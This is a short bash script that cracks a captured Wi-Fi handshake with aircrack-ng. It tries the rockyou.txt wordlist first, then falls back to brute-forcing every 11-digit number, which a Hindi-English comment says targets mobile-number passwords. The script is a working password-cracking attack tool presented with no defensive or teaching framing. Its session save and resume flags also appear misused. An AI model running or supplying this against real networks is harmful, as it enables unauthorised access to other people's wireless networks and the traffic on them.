#!/bin/bash
CAP_FILE="/tmp/awb_attack-01.cap"
SESSION="/tmp/awb_session"
MODE=$1 # "start" or "resume"

if [ "$MODE" == "resume" ]; then
    if [ -f "$SESSION" ]; then
        echo "Resuming previous session..."
        aircrack-ng -r $SESSION -w /usr/share/wordlists/rockyou.txt $CAP_FILE > /tmp/crack_output.txt 2>&1
    else
        echo "No session found. Starting fresh..."
        aircrack-ng -s $SESSION -w /usr/share/wordlists/rockyou.txt $CAP_FILE > /tmp/crack_output.txt 2>&1
    fi
else
    rm -f $SESSION
    echo "Starting rockyou.txt..."
    aircrack-ng -s $SESSION -w /usr/share/wordlists/rockyou.txt $CAP_FILE > /tmp/crack_output.txt 2>&1
fi

# Check if password found in rockyou
if grep -q "KEY FOUND" /tmp/crack_output.txt; then
    grep "KEY FOUND" /tmp/crack_output.txt
    exit 0
fi

# Agar rockyou fail ho jaye, toh Crunch chalao (11 digit mobile numbers)
echo "rockyou failed. Starting Crunch (11-digit numbers)..."
crunch 11 11 0123456789 | aircrack-ng -w - -a 2 $CAP_FILE > /tmp/crack_output.txt 2>&1

if grep -q "KEY FOUND" /tmp/crack_output.txt; then
    grep "KEY FOUND" /tmp/crack_output.txt
    exit 0
fi

echo "NO_PASSWORD_FOUND"